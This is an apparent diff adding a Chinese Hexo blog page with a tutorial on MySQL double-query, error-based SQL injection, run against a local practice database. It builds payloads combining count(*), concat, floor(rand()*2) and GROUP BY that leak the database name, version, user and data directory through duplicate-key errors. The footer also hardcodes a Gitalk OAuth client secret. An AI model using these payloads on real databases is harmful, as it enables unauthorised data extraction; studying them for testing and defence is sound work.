@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+  
+  <title>sqlInject_double_query_inject-concat - 失焦——致所有美好的</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+  
+  
+
+  <link rel="shortcut icon" href="https://shijoa.github.io/logo.png" type="image/png" />
+  <meta name="description" content="参考：http:&#x2F;&#x2F;www.2cto.com&#x2F;article&#x2F;201303&#x2F;192718.html原网站的有点low，图片和css样式都丢失了，阅读起来很是费劲。但瑕不掩瑜，对于sql双查询注入讲得很好，因此我尝试按照原文，以自己的语言和实践，对其进行翻新">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlInject_double_query_inject-concat">
+<meta property="og:url" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/index.html">
+<meta property="og:site_name" content="失焦——致所有美好的">
+<meta property="og:description" content="参考：http:&#x2F;&#x2F;www.2cto.com&#x2F;article&#x2F;201303&#x2F;192718.html原网站的有点low，图片和css样式都丢失了，阅读起来很是费劲。但瑕不掩瑜，对于sql双查询注入讲得很好，因此我尝试按照原文，以自己的语言和实践，对其进行翻新">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/connect_mysql.jpg">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/use_security.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/concat_easy.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/concat_string12.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/rand()1.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/rand()2.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/floor.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/floor2.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/concat_little_hard.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/concat_little_hard_from.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/concat_little_hard_from_inf.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/concat_little_hard_from_group.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/shine_point_database.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/shine_point_version.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/shine_point_user.png">
+<meta property="og:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/shine_point_end.png">
+<meta property="article:published_time" content="2021-04-28T08:13:20.000Z">
+<meta property="article:modified_time" content="2021-04-29T01:56:29.278Z">
+<meta property="article:author" content="ShiJoa">
+<meta property="article:tag" content="网络">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/connect_mysql.jpg">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,gh/nexmoe/nexmoe.github.io@latest/lib/mdui_043tiny/css/mdui.css,gh/nexmoe/nexmoe.github.io@latest/lib/iconfont/iconfont.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css?v=233" crossorigin>
+  
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_2260593_qqf95agpakh.css">
+  
+  <link rel="stylesheet" href="/css/style.css?v=1624862877534">
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <script src="https://unpkg.com/css-doodle@0.10.0/css-doodle.min.js"></script>
+<style>
+    css-doodle {
+        --rule: (
+            :doodle {
+                @grid: 50x1 / 100vmin;
+                perspective: 50vmin;
+            }
+
+            background: @multi(@r(40, 20), (radial-gradient(@p(#53d9d1, #f27b9b, #eb7132) 15%, transparent 50%) @r(100%) @r(100%) / @r(1%, 3%, .1) @lr() no-repeat));
+
+            @size: 150%;
+            @place-cell: center;
+            animation: scale-up 15s linear infinite;
+            animation-delay: calc(@i() * -.4s);
+
+            @keyframes scale-up {
+                0% {
+                    opacity: 0;
+                    transform: translate3d(0, 0, 0) rotate(0);
+                }
+
+                10% {
+                    opacity: 1;
+                }
+
+                95% {
+                    transform: translate3d(0, 0, @r(40vmin, 85vmin)) rotate(@r(-360deg, 360deg));
+                }
+
+                100% {
+                    opacity: 0;
+                    transform: translate3d(0, 0, 1vmin);
+                }
+            }
+
+        );
+    }
+</style>
+<div class="css-doodle">
+    <css-doodle use="var(--rule)"></css-doodle>
+</div>
+    <div class="nexmoe-bg" style="background-image: url(https://shijoa.github.io/background2.jpg)"></div>
+    
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="ShiJoa" class="mdui-btn mdui-btn-icon"><img src="https://shijoa.github.io/logo.png" alt="ShiJoa"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="ShiJoa">
+            <img src="https://shijoa.github.io/logo.png" alt="ShiJoa" alt="ShiJoa">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>23</div>
+        <div><span>Tags</span>15</div>
+        <div><span>Categories</span>3</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="首页">
+            <i class="mdui-list-item-icon nexmoefont icon-icon_home"></i>
+            <div class="mdui-list-item-content">
+                首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/archives" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于我">
+            <i class="mdui-list-item-icon nexmoefont icon-huiyuan"></i>
+            <div class="mdui-list-item-content">
+                关于我
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/Gallery.html" title="画廊">
+            <i class="mdui-list-item-icon nexmoefont icon-pictureframephotopainting"></i>
+            <div class="mdui-list-item-content">
+                画廊
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-fenxiang"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        <form id="search_form" action_e="https://www.google.com/search?q={shijoa.github.io}}" onsubmit="return search();">
+            <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+        </form>
+    </div>
+</div>
+  
+  <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://qm.qq.com/cgi-bin/qm/qr?k=PPxB90Ek7ypSg_IrhYMeWaHWyTsbmM9B&noverify=0" target="_blank" mdui-tooltip="{content: 'QQ'}" style="color: rgb(249, 174, 8);background-color: rgba(249, 174, 8, .1);">
+            <i class="nexmoefont icon-qq"></i>
+        </a><a class="mdui-ripple" href="https://space.bilibili.com/19674502" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-CN_bilibiliB"></i>
+        </a><a class="mdui-ripple" href="https://https://github.com/ShiJoa" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a><a class="mdui-ripple" href="https://www.pixiv.net/users/26561422" target="_blank" mdui-tooltip="{content: 'Pixiv'}" style="color: rgb(3,152,150);background-color: rgba(3,152,150,.15);">
+            <i class="nexmoefont icon-DESIGN_Pixiv"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Categories</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/学习/">学习</a>
+          <span class="category-list-count">10</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/生活/">生活</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/项目/">项目</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/FLAG/" style="font-size: 10px;">FLAG</a> <a href="/tags/Windows%E5%86%85%E6%A0%B8/" style="font-size: 10px;">Windows内核</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 12px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81/" style="font-size: 18px;">代码</a> <a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 14px;">博客</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 14px;">学习</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 18px;">安全</a> <a href="/tags/%E6%95%85%E4%BA%8B/" style="font-size: 12px;">故事</a> <a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 16px;">木马</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 12px;">生活</a> <a href="/tags/%E7%94%BB%E7%94%BB/" style="font-size: 12px;">画画</a> <a href="/tags/%E7%B3%BB%E7%BB%9F/" style="font-size: 16px;">系统</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 20px;">编程</a> <a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 14px;">网络</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 14px;">随笔</a>
+    </div>
+    
+  </div>
+
+  
+  <!--档案室Archive-->
+
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">13</span></li></ul>
+    </div>
+  </div>
+
+
+<style>
+.nexmoe-widget .archive-list-count{
+	position : absolute;
+	right: 15px;
+	top:9px;
+	color: #DDD;
+}
+</style>
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2021 ShiJoa
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+  
+      <div class="nexmoe-post-cover" style="padding-bottom: 68.33333333333333%;"> 
+          <img data-src="https://shijoa.github.io/background2.jpg" data-sizes="auto" alt="sqlInject_double_query_inject-concat" class="lazyload">
+          <h1>sqlInject_double_query_inject-concat</h1>
+      </div>
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年04月28日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1,289 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
+</div>
+
+  <div class="nexmoe-post-right">
+    
+      <div class="nexmoe-fixed">
+        <div class="nexmoe-valign">
+            <div class="nexmoe-toc">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.</span> <span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">双查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%89%8B%E5%AE%9E%E9%AA%8C"><span class="toc-number">2.1.</span> <span class="toc-text">动手实验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#concat"><span class="toc-number">2.1.1.</span> <span class="toc-text">concat()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rand"><span class="toc-number">2.1.2.</span> <span class="toc-text">rand()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#floor"><span class="toc-number">2.1.3.</span> <span class="toc-text">floor()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BB%84%E5%90%88"><span class="toc-number">2.1.4.</span> <span class="toc-text">尝试组合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%A4%A7%E9%9A%BE%E5%BA%A6"><span class="toc-number">2.1.5.</span> <span class="toc-text">加大难度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E4%B8%8AGroup-by%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.6.</span> <span class="toc-text">加上Group by语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84%E4%BA%AE%E7%82%B9%E6%9D%A5%E5%95%A6"><span class="toc-number">2.1.7.</span> <span class="toc-text">最后的亮点来啦</span></a></li></ol></li></ol></li></ol>
+            </div>
+        </div>
+      </div>
+    
+  </div>
+
+  <article>
+    <p>参考：<a target="_blank" rel="noopener" href="http://www.2cto.com/article/201303/192718.html">http://www.2cto.com/article/201303/192718.html</a><br>原网站的有点low，图片和css样式都丢失了，阅读起来很是费劲。但瑕不掩瑜，对于sql双查询注入讲得很好，因此我尝试按照原文，以自己的语言和实践，对其进行翻新</p>
+<a id="more"></a>
+
+<h1 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h1><p>在讲清楚双查询注入之前，我们理解一下子查询。<br>查询的关键字是select，这个大家都知道。（如果不知道，那这篇文章你还读不懂，先去学习sql查询语句，数据库原理）<br>子查询可以简单的理解在一个select语句里还有一个select。里面的这个select语句就是子查询。</p>
+<p>看一个简单的例子：</p>
+<pre><code>Select concat((select database()));</code></pre>
+<p>这句查询语句在真正执行的时候，先从子查询进行。<br>执行select database() 这个语句就会把当前的数据库查出来，然后把结果传入到concat函数。<br>而concat()这个函数是用来连接的。比如 concat(‘a’,’b’)那结果就是ab了。</p>
+<h1 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h1><p>双查询注入需要理解四个函数/语句</p>
+<ol>
+<li><p>Rand() //随机函数</p>
+</li>
+<li><p>Floor() //取整函数</p>
+</li>
+<li><p>Count() //汇总函数</p>
+</li>
+<li><p>Group by clause //分组语句</p>
+</li>
+</ol>
+<p>双查询注入原理用简单简单的一句话来概括——当在一个聚合函数（比如count函数）后面如果使用分组语句，mysql就会把查询的一部分以错误的形式显示出来。</p>
+<h2 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h2><p>以本地一个名为Security的数据库为例</p>
+<p>首先在命令行下输入</p>
+<pre><code>mysql -u root –p</code></pre>
+<p>之后输入密码<br>就连上了mysql。<br><img src="connect_mysql.jpg"></p>
+<p>然后通过</p>
+<pre><code>use security； </code></pre>
+<p>就可以切换到security数据库。<br><img src="use_security.png"></p>
+<h3 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h3><p>我们执行一下前面那个简单的子查询的例子</p>
+<pre><code>SELECT concat((select database()));</code></pre>
+<p><img src="concat_easy.png"></p>
+<p>就能显示security，也就是显示了当前数据库的名字。</p>
+<p>然后我们测试一下concat的用法。输入</p>
+<pre><code>SELECT concat(&#39;string1&#39;,&#39;string2&#39;);</code></pre>
+<p><img src="concat_string12.png" title="这里我的mysql服务出了点问题，重连了，可以无视它"><br>显然结果就是string1string2</p>
+<h3 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h3><p>然后我们测试一下rand()</p>
+<pre><code>Select rand();</code></pre>
+<p><img src="rand()1.png"><br>我们多执行几次</p>
+<p><img src="rand()2.png"><br>可以看到，这个函数就是个随机函数，返回大于0，小于1之间的数</p>
+<h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>然后看看floor()函数</p>
+<pre><code>Select floor(1.1123456);</code></pre>
+<p><img src="floor.png"><br>这个函数就是个取整函数，返回小于等于你输入的数的整数。</p>
+<h3 id="尝试组合"><a href="#尝试组合" class="headerlink" title="尝试组合"></a>尝试组合</h3><p>然后我们看看双注入查询中的一个简单组合。</p>
+<pre><code>SELECT floor(rand()*2);</code></pre>
+<p><img src="floor2.png"><br>我们从里向外看。rand() 返回大于0小于1的小数，乘以2之后就成了小于0小于2。然后对结果进行取整，结果就只能是0或1。所以这个查询的结果不是1，就是0</p>
+<h3 id="加大难度"><a href="#加大难度" class="headerlink" title="加大难度"></a>加大难度</h3><p>看这个查询</p>
+<pre><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));</code></pre>
+<p>句子开始有点长了，但不要怕。先看最里面的SELECT database() 这个返回的是数据库名，在这里就是security。然后FLOOR(RAND()*2)这个上面说过了——不是0，就是1。最后把这两个的结果进行concat连接，所以结果就是security0或者security1。<br><img src="concat_little_hard.png"></p>
+<p>如果我们把这条语句后面加上from 一个表名。一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录。<br>在这里users表里有13个用户，所以返回了13条<br><img src="concat_little_hard_from.png"></p>
+<p>如果是从information_schema.schemata里，这个表里包含了mysql的所有数据库名。这里本机有三个数据库。所以会返回三个结果<br><img src="concat_little_hard_from_inf.png"></p>
+<h3 id="加上Group-by语句"><a href="#加上Group-by语句" class="headerlink" title="加上Group by语句"></a>加上Group by语句</h3><p>这次实验，我们使用information_schema.tables 或者 information_schema.columns两个表来查询。<br>因为其他表里面一般数据很多。容易生成很多的随机值，不至于全部是security0，这样就不能查询出结果。</p>
+<pre><code>select concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</code></pre>
+<p><img src="concat_little_hard_from_group.png"></p>
+<p>解释一下：<br>我们把concat((select database()), floor(rand()*2)) 这个结果取了一个别名 a ，然后使用他进行分组。这样相同的security0分到一组，security1分到一组。所以就剩下两个结果。</p>
+<p>注意这里的database()可以替换成任何你想查的函数，比如version(), user(), datadir()或者其他的查询，原理都是一样的。<br>像这样：</p>
+<pre><code>select concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;
+select concat((select user()), floor(rand()*2))as a from information_schema.tables group by a;
+select concat((select datadir()), floor(rand()*2))as a from information_schema.tables group by a;</code></pre>
+<h3 id="最后的亮点来啦"><a href="#最后的亮点来啦" class="headerlink" title="最后的亮点来啦"></a>最后的亮点来啦</h3><p>我们输入这条：注意多了一个聚合函数count(*)</p>
+<pre><code>select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</code></pre>
+<p>报错了<br><img src="shine_point_database.png"><br>重复的键值 可以看到security就是我们的查询结果</p>
+<p>想要查询版本就这样：</p>
+<pre><code>select count(*), concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;</code></pre>
+<p>看看替换了database()为version()<br><img src="shine_point_version.png"></p>
+<p>再来一个<br>    select count(*), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()*2))as a from information_schema.tables group by a;<br>报错<br><img src="shine_point_user.png" title="这里的~这个符号只是为了让结果更清晰。"></p>
+<p>还有一个比较复杂的，叫做派生表。需要使用</p>
+<pre><code>select 1 from (table name); </code></pre>
+<p>这样的语法来报错，具体就是</p>
+<pre><code>select 1 from (select count(*), concat(&#39;~&#39;,(select user()),&#39;~&#39;, floor(rand()*2))as a from information_schema.tables group by a)x;</code></pre>
+<p>报错<br><img src="shine_point_end.png"></p>
+
+  </article>
+
+  
+    
+  <div class="nexmoe-post-copyright">
+    <strong>Author：</strong>ShiJoa<br>
+    <strong>Link：</strong><a href="https://shijoa.github.io/2021/04/28/sqlInject-double-query-inject-concat/" title="https:&#x2F;&#x2F;shijoa.github.io&#x2F;2021&#x2F;04&#x2F;28&#x2F;sqlInject-double-query-inject-concat&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;shijoa.github.io&#x2F;2021&#x2F;04&#x2F;28&#x2F;sqlInject-double-query-inject-concat&#x2F;</a><br>
+    
+      <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+    
+  </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a>
+    
+</div>
+
+  <div class="nexmoe-post-footer">
+    <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script src="/js/src/md5.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '65a6363c4b6bd3c3b2a5',
+        clientSecret: '530dcf1ad96ee2fb56f633b421b1b982d6484812',
+        id: decodeURI(location.pathname),
+        repo: 'ShiJoa.github.io',
+        owner: 'ShiJoa',
+        admin: 'ShiJoa'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+  </div>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+ <script src="/js/app.js?v=1624862877535"></script>
+
+  
+
+
+
+
+
+</body>
+
+</html>
